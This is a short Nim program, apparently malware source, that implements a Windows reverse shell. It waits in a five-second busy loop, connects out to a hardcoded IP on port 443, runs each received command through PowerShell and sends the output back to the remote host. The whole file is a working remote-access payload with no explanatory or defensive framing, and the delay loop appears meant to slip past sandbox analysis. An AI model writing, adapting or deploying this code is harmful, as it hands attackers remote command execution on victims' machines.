import os
import net
import osproc
import strformat
import times

var socket = newSocket()

let sai = now() + 5.seconds
var i = 0

while now() <= sai:
    var i = i + 1

proc shell(ip: string, port: int): void =

    try:
        socket.connect(ip, Port(port))

        while true:
            socket.send("Hii-imeenda> ")
            let powershell = socket.recvLine()
            if powershell == "exit":
                break
            let result = execProcess("powershell /c " & powershell)
            socket.send(result)


    except:
        raise
    finally:
        socket.close


when isMainModule:
    try:
        let ip = "10.100.100.14"
        let port = 443
        shell(ip, port)
    except:
        raise





